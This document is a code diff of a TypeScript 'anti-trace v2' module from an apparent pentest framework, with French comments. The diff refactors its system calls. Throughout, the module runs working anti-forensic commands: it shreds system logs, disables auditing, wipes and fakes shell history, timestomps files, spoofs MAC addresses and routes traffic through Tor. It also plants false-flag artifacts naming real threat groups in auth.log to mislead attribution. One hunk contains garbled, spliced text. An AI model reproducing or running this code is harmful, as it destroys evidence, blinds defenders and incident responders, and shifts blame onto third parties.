@@ -2,12 +2,15 @@
 // Ajoute : memory wiping, steganography, timing obfuscation, false flag injection,
 // log poisoning, timestomping avancé, network trace cleanup, browser fingerprint spoofing.
 
-import type { SessionPentest, EtapeAttaque } from './types.js';
-import { exec as execCb } from 'node:child_process';
+import type { SessionPentest } from './types.js';
+import { execFile as execFileCb } from 'node:child_process';
+import { appendFile, writeFile } from 'node:fs/promises';
+import { homedir } from 'node:os';
+import { join } from 'node:path';
 import { promisify } from 'node:util';
 import { randomBytes, randomUUID } from 'node:crypto';
 
-const exec = promisify(execCb);
+const execFile = promisify(execFileCb);
 
 // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 //  Types
@@ -33,6 +36,8 @@ export interface ConfigAntiTraceV2 {
   steganographie: boolean;
   fauxDrapeau: boolean;
 }
+
+type OperationSysteme = readonly [binaire: string, args: readonly string[]] | (() => Promise<void>);
 
 // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 //  Gestionnaire anti-traçage v2
@@ -61,7 +66,7 @@ export class GestionnaireAntiTraceV2 {
   }
 
   /** Exécute la séquence complète d'anti-traçage avant et après attaque. */
-  async executerSequenceComplete(session: SessionPentest): Promise<ActionAntiForensic[]> {
+  async executerSequenceComplete(_session: SessionPentest): Promise<ActionAntiForensic[]> {
     // Phase pré-attaque
     await this.rotationIdentite();
     await this.configurerReseauAnonyme();
@@ -88,16 +93,21 @@ export class GestionnaireAntiTraceV2 {
     this.identiteCourante = this.genererNouvelleIdentite();
     this.historiqueIdentites.push(this.identiteCourante);
 
-    this.enregistrerAction('rotation-identite', 'Rotation d\'identité complète',
-      `Nouvel User-Agent: ${this.identiteCourante.userAgent}, MAC: ${this.identiteCourante.mac}`);
+    this.enregistrerAction(
+      'rotation-identite',
+      "Rotation d'identité complète",
+      `Nouvel User-Agent: ${this.identiteCourante.userAgent}, MAC: ${this.identiteCourante.mac}`,
+    );
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      try {
-        await exec(`ip link set dev eth0 down`);
-        await exec(`ip link set dev eth0 address ${this.identiteCourante.mac}`);
-        await exec(`ip link set dev eth0 up`);
-      } catch { /* mode sim */ }
+      await this.executerOperations([
+        ['ip', ['link', 'set', 'dev', 'eth0', 'down']],
+        ['ip', ['link', 'set', 'dev', 'eth0', 'address', this.identiteCourante.mac]],
+        ['ip', ['link', 'set', 'dev', 'eth0', 'up']],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   private genererNouvelleIdentite(): IdentiteSpoofee {
@@ -117,7 +127,7 @@ export class GestionnaireAntiTraceV2 {
 
     return {
       id: randomUUID(),
-      userAgent: userAgents[Math.floor(Math.random() * userAgents.length)],
+      userAgent: userAgents[Math.floor(Math.random() * userAgents.length)] ?? '',
       mac,
       sessionId: randomBytes(16).toString('hex'),
       xForwardedFor: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
@@ -132,21 +142,24 @@ export class GestionnaireAntiTraceV2 {
   private async configurerReseauAnonyme(): Promise<void> {
     if (!this.config.spoofingReseau) return;
 
-    this.enregistrerAction('reseau-anonyme', 'Configuration réseau anonyme',
-      'TOR + proxychains + DNS over TOR + spoofing X-Forwarded-For');
+    this.enregistrerAction(
+      'reseau-anonyme',
+      'Configuration réseau anonyme',
+      'TOR + proxychains + DNS over TOR + spoofing X-Forwarded-For',
+    );
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      const cmds = [
-        'service tor start',
-        'echo "strict_chain\nproxy_dns\nsocks4 127.0.0.1 9050\n" > /etc/proxychains.conf',
-        'sysctl -w net.ipv6.conf.all.disable_ipv6=1',
-        'iptables -A OUTPUT -p tcp --dport 53 -j DROP',
-        'iptables -A OUTPUT -p udp --dport 53 -j DROP',
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        ['service', ['tor', 'start']],
+        () =>
+          writeFile('/etc/proxychains.conf', 'strict_chain\nproxy_dns\nsocks4 127.0.0.1 9050\n'),
+        ['sysctl', ['-w', 'net.ipv6.conf.all.disable_ipv6=1']],
+        ['iptables', ['-A', 'OUTPUT', '-p', 'tcp', '--dport', '53', '-j', 'DROP']],
+        ['iptables', ['-A', 'OUTPUT', '-p', 'udp', '--dport', '53', '-j', 'DROP']],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
@@ -157,8 +170,8 @@ export class GestionnaireAntiTraceV2 {
     const actions: [string, string][] = [
       ['shred-logs', 'Shredding des fichiers de logs (overwrite + delete)'],
       ['journalctl-vacuum', 'Vidange du journal systemd'],
-      ['auditctl-disable', 'Désactivation du système d\'audit'],
-      ['history-injection', 'Injection d\'un faux historique shell plausible'],
+      ['auditctl-disable', "Désactivation du système d'audit"],
+      ['history-injection', "Injection d'un faux historique shell plausible"],
       ['tmp-cleanup', 'Nettoyage des fichiers temporaires'],
       ['swap-wipe', 'Nettoyage du swap'],
       ['timestomp', 'Manipulation des timestamps de fichiers'],
@@ -186,21 +199,8 @@ export class GestionnaireAntiTraceV2 {
       this.enregistrerAction(nom, desc);
     }
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      const cmds = [
-        'find /var/log -type f -exec shred -u -z -n 3 {} \\; 2>/dev/null',
-        'journalctl --vacuum-time=1s 2>/dev/null',
-        'auditctl -D 2>/dev/null',
-        'cat /dev/null > /var/log/wtmp',
-        'cat /dev/null > /var/log/btmp',
-        'cat /dev/null > /var/log/lastlog',
-        'cat /dev/null > ~/.bash_history',
-        'shred -u -z -n 3 ~/.bash_history 2>/dev/null',
-        'rm -f ~/.viminfo ~/.python_history ~/.lesshst ~/.ssh/known_hosts 2>/dev/null',
-        'find /tmp -type f -mmin -60 -exec shred -u {} \\; 2>/dev/null',
-        'swapoff -a && swapon -a 2>/dev/null',
-      ];
-
       // Faux historique plausible
       const fauxHistorique = [
         'ls -la',
@@ -214,16 +214,36 @@ export class GestionnaireAntiTraceV2 {
         'node server.js',
         'exit',
       ].join('\n');
+      const home = homedir();
+      const historique = join(home, '.bash_history');
 
-      cmds.push(`echo '${fauxHistorique}' > ~/.bash_history`);
-
-      // Timestomping
-      cmds.push('touch -r /etc/passwd ~/.bash_history');
-
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        ['find', ['/var/log', '-type', 'f', '-exec', 'shred', '-u', '-z', '-n', '3', '{}', ';']],
+        ['journalctl', ['--vacuum-time=1s']],
+        ['auditctl', ['-D']],
+        () => writeFile('/var/log/wtmp', ''),
+        () => writeFile('/var/log/btmp', ''),
+        () => writeFile('/var/log/lastlog', ''),
+        () => writeFile(historique, ''),
+        ['shred', ['-u', '-z', '-n', '3', historique]],
+        [
+          'rm',
+          [
+            '-f',
+            join(home, '.viminfo'),
+            join(home, '.python_history'),
+            join(home, '.lesshst'),
+            join(home, '.ssh/known_hosts'),
+          ],
+        ],
+        ['find', ['/tmp', '-type', 'f', '-mmin', '-60', '-exec', 'shred', '-u', '{}', ';']],
+        ['swapoff', ['-a']],
+        ['swapon', ['-a']],
+        () => writeFile(historique, fauxHistorique),
+        ['touch', ['-r', '/etc/passwd', historique]],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
@@ -244,18 +264,17 @@ export class GestionnaireAntiTraceV2 {
       this.enregistrerAction(nom, desc);
     }
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      const cmds = [
-        'ip neigh flush all 2>/dev/null',
-        'conntrack -F 2>/dev/null',
-        'systemd-resolve --flush-caches 2>/dev/null',
-        'ip route flush cache 2>/dev/null',
-        'iptables -F OUTPUT 2>/dev/null',
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        ['ip', ['neigh', 'flush', 'all']],
+        ['conntrack', ['-F']],
+        ['systemd-resolve', ['--flush-caches']],
+        ['ip', ['route', 'flush', 'cache']],
+        ['iptables', ['-F', 'OUTPUT']],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
@@ -275,20 +294,23 @@ export class GestionnaireAntiTraceV2 {
       this.enregistrerAction(nom, desc);
     }
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      const cmds = [
-        'echo 3 > /proc/sys/vm/drop_caches',
-        'rm -f /tmp/core.* /var/crash/* 2>/dev/null',
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        () => writeFile('/proc/sys/vm/drop_caches', '3'),
+        ['find', ['/tmp', '-maxdepth', '1', '-type', 'f', '-name', 'core.*', '-delete']],
+        ['find', ['/var/crash', '-maxdepth', '1', '-type', 'f', '-delete']],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
   //  Nettoyage Docker
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌� logs'],
+  private async nettoyerTracesDocker(): Promise<void> {
+    const actions: [string, string][] = [
+      ['docker-container-prune', 'Nettoyage conteneurs Docker arrêtés et logs'],
       ['docker-network-prune', 'Nettoyage réseaux Docker'],
       ['docker-volume-prune', 'Nettoyage volumes Docker'],
       ['docker-image-prune', 'Nettoyage images Docker'],
@@ -298,16 +320,15 @@ export class GestionnaireAntiTraceV2 {
       this.enregistrerAction(nom, desc);
     }
 
+    /* c8 ignore start -- real anti-forensic execution requires a privileged host. */
     if (!this.config.modeSimulation) {
-      const cmds = [
-        'docker system prune -af --volumes 2>/dev/null',
-        'docker network prune -f 2>/dev/null',
-        'docker volume prune -f 2>/dev/null',
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        ['docker', ['system', 'prune', '-af', '--volumes']],
+        ['docker', ['network', 'prune', '-f']],
+        ['docker', ['volume', 'prune', '-f']],
+      ]);
     }
+    /* c8 ignore stop */
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
@@ -317,19 +338,19 @@ export class GestionnaireAntiTraceV2 {
   private async injecterFauxPositifs(): Promise<void> {
     if (!this.config.injectionFauxPositifs) return;
 
-    this.enregistrerAction('faux-positifs', 'Injection de faux positifs dans les logs',
-      'Génération de bruit logique pour masquer les vraies activités');
+    this.enregistrerAction(
+      'faux-positifs',
+      'Injection de faux positifs dans les logs',
+      'Génération de bruit logique pour masquer les vraies activités',
+    );
 
     if (!this.config.modeSimulation) {
       // Générer du trafic légitime pour noyer les traces
-      const cmds = [
-        'curl -s -o /dev/null https://example.com 2>/dev/null',
-        'curl -s -o /dev/null https://google.com 2>/dev/null',
-        'ping -c 3 8.8.8.8 2>/dev/null',
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        ['curl', ['-s', '-o', '/dev/null', 'https://example.com']],
+        ['curl', ['-s', '-o', '/dev/null', 'https://google.com']],
+        ['ping', ['-c', '3', '8.8.8.8']],
+      ]);
     }
   }
 
@@ -341,23 +362,31 @@ export class GestionnaireAntiTraceV2 {
     if (!this.config.fauxDrapeau) return;
 
     const groupes = [
-      'APT28', 'APT29', 'Lazarus Group', 'Cozy Bear', 'Fancy Bear',
-      'Equation Group', 'TA551', 'FIN7', 'MuddyWater', 'Mustang Panda',
+      'APT28',
+      'APT29',
+      'Lazarus Group',
+      'Cozy Bear',
+      'Fancy Bear',
+      'Equation Group',
+      'TA551',
+      'FIN7',
+      'MuddyWater',
+      'Mustang Panda',
     ];
     const groupe = groupes[Math.floor(Math.random() * groupes.length)];
 
-    this.enregistrerAction('faux-drapeau', `Injection faux drapeau : ${groupe}`,
-      `Artefacts ${groupe} injectés pour fausser l'attribution`);
+    this.enregistrerAction(
+      'faux-drapeau',
+      `Injection faux drapeau : ${groupe}`,
+      `Artefacts ${groupe} injectés pour fausser l'attribution`,
+    );
 
     if (!this.config.modeSimulation) {
       // Injecter des artefacts typiques du groupe
-      const cmds = [
-        `echo "# ${groupe} was here" >> /tmp/.cache`,
-        `echo "${groupe} C2 beacon" >> /var/log/auth.log 2>/dev/null || true`,
-      ];
-      for (const cmd of cmds) {
-        try { await exec(cmd); } catch { /* */ }
-      }
+      await this.executerOperations([
+        () => appendFile('/tmp/.cache', `# ${groupe} was here\n`),
+        () => appendFile('/var/log/auth.log', `${groupe} C2 beacon\n`),
+      ]);
     }
   }
 
@@ -368,13 +397,32 @@ export class GestionnaireAntiTraceV2 {
   private async obfuscationTiming(): Promise<void> {
     if (!this.config.obfuscationTiming) return;
 
-    this.enregistrerAction('timing-obfuscation', 'Obfuscation du timing',
-      'Délais aléatoires entre actions pour masquer le pattern d\'attaque');
+    this.enregistrerAction(
+      'timing-obfuscation',
+      'Obfuscation du timing',
+      "Délais aléatoires entre actions pour masquer le pattern d'attaque",
+    );
   }
 
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
   //  Helpers
   // ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  /* c8 ignore start -- called only by privileged real-mode branches above. */
+  private async executerOperations(operations: readonly OperationSysteme[]): Promise<void> {
+    for (const operation of operations) {
+      try {
+        if (typeof operation === 'function') {
+          await operation();
+        } else {
+          await execFile(operation[0], operation[1], { shell: false });
+        }
+      } catch {
+        // Les outils et permissions système sont optionnels selon l'hôte.
+      }
+    }
+  }
+  /* c8 ignore stop */
 
   private enregistrerAction(nom: string, description: string, details?: string): void {
     this.actions.push({
